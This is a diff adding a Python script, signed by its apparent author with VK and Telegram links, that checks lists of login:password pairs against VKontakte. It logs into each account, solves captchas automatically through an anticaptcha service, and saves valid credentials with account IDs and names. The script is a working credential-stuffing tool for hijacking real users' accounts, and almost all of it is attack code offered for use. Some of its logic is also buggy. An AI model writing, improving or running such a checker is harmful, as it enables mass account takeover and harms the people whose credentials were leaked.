@@ -1,0 +1,149 @@
+################################################
+#      _  _   _______      ______________      #
+#    _| || |_|  __ \ \    / /___  /  ____      #
+#   |_  __  _| |__) \ \  / /   / /| |__        #
+#    _| || |_|  _  / \ \/ /   / / |  __|       #
+#   |_  __  _| | \ \  \  /   / /__| |____      #
+#     |_||_| |_|  \_\  \/   /_____|______      #
+#                                              #
+#           VKontakte Checker by #rvze         #
+#           VK: https://vk.com/dimas257        #
+#           TG: https://t.me/dimas257          #
+################################################
+
+import vk_api
+from colorama import init
+import sys
+import argparse
+import os
+from python3_anticaptcha import ImageToTextTask
+
+block = '[5] User authorization failed: user is blocked.'
+
+# ------------------------ #
+# Палитра цветов
+class color:
+    Error = '\033[31m'
+    ErrorText = '\033[3;31m'
+    Done = '\033[32m'
+    Warn = '\033[43m'
+    Default = '\033[0m'
+
+# ------------------------ #
+# Функция print для отображения цветного текста
+def con(text):
+    print(text + color.Default)
+
+# ------------------------ #
+# Интеграция python3_anticaptcha
+def captcha_handler(captcha):
+    if not ANTICAPTCHA_KEY or ANTICAPTCHA_KEY == '':
+    	# Если ключ не указан, будет выведено сообщение с ссылкой на картинку
+        solution = input("Решите капчу ({0}): ".format(captcha.get_url()))
+        return captcha.try_again(solution)
+    key = ImageToTextTask.ImageToTextTask(
+        anticaptcha_key=ANTICAPTCHA_KEY, save_format='const').captcha_handler(captcha_link=captcha.get_url())
+    return captcha.try_again(key['solution']['text'])
+
+# ------------------------ #
+# Главный поток
+def main():
+    file = open(filed, 'r')
+    savefile = open(savefiled, 'w')
+    savefile.write('################################################\n#      _  _   _______      ______________      #\n#    _| || |_|  __ \ \    / /___  /  ____      #\n#   |_  __  _| |__) \ \  / /   / /| |__        #\n#    _| || |_|  _  / \ \/ /   / / |  __|       #\n#   |_  __  _| | \ \  \  /   / /__| |____      #\n#     |_||_| |_|  \_\  \/   /_____|______      #\n#                                              #\n################################################\n')
+    savefile.write('\n')
+    print(f'Настройки приняты\n-----------------\nАнтикапча: {ANTICAPTCHA_KEY}\nПуть до файла с аккаунтами: {filed}\nФайл для сохранения валида: {savefiled}\n-----------------')
+    while True:
+        line = str(file.readline())
+        if not line:
+            try:
+                input("Работа закончена. Для выхода нажмите Enter/Ctrl+C...")
+                sys.exit()
+            except KeyboardInterrupt:
+                sys.exit(1)
+        line = line.split()[0]
+        login = line.split(':')[0]
+        passwd = line.split(':')[1]
+        dead = 0
+        try:
+        	vk_session = vk_api.VkApi(login, passwd, captcha_handler=captcha_handler)
+        	vk_session.auth()
+        except vk_api.exceptions.BadPassword:
+        	con(f'{color.Error}Аккаунт {login}:{passwd} невалиден.')
+        vk = vk_session.get_api()
+        try:
+            a = vk.users.get()[0]
+        except vk_api.exceptions.ApiError as e:
+            e = e
+            if str(e) == str(block) :
+                con(f'{color.Error}Аккаунт {login}:{passwd} заблокирован.')
+            else:
+                con(f'{color.Error}Непредвиденная ошибка: {color.ErrorText}{e}')
+            dead = 1
+        except Exception as e:
+            print(e)
+        if dead == 0:
+            con(f"{color.Done}Аккаунт id{a['id']} валиден.")
+            savefile.write(f'--------------------------\nLogin: {login}\nPassword: {passwd}\n')
+            savefile.write('Account link: https://vk.com/id' + str(a['id']) + '\nAccount name: ' + str(a['first_name']) + ' ' + str(a['last_name']) + '\n')
+            savefile.write(f'\n')
+
+# ------------------------ #
+# Парсер аргументов
+parser = argparse.ArgumentParser(description='VKChecker settings:')
+
+parser.add_argument(
+    '-f',
+    '--file',
+    help='File with a accounts.'
+    )
+parser.add_argument(
+    '-o',
+    '--outfile',
+    help='Output file.'
+    )
+parser.add_argument(
+	'-a',
+	'--anticaptcha',
+	help='anticaptcha.com API key.',
+	)
+args = parser.parse_args()
+
+init()
+
+# ------------------------ #
+# Если аргументы не указаны, они будут запрошены функциями снизу
+def filed():
+	init()
+	if args.file:
+		file = args.file
+	else:
+		file = input('Укажите путь до файла с аккаунтами: ')
+		if not os.path.exists(file):
+			con(f'{color.Error}Файла {file} не существует!')
+			file()
+	return file
+def savefiled():
+	if args.outfile:
+		savefile = args.outfile
+	else:
+		savefile = input('Укажите, куда сохранять валид: ')
+	return savefile
+
+# ------------------------ #
+# Проверка, указаны ли аргументы
+if not args.file:
+	filed = filed()
+else:
+	filed = args.file
+if not args.outfile:
+	savefiled = savefiled()
+else:
+	savefiled = args.outfile
+if not args.anticaptcha:
+	ANTICAPTCHA_KEY = input('Введите ключ антикапчи (Пропустите если не нужен): ')
+else:
+	ANTICAPTCHA_KEY = args.anticaptcha
+# ------------------------ #
+# Запускатор главной функции
+main()
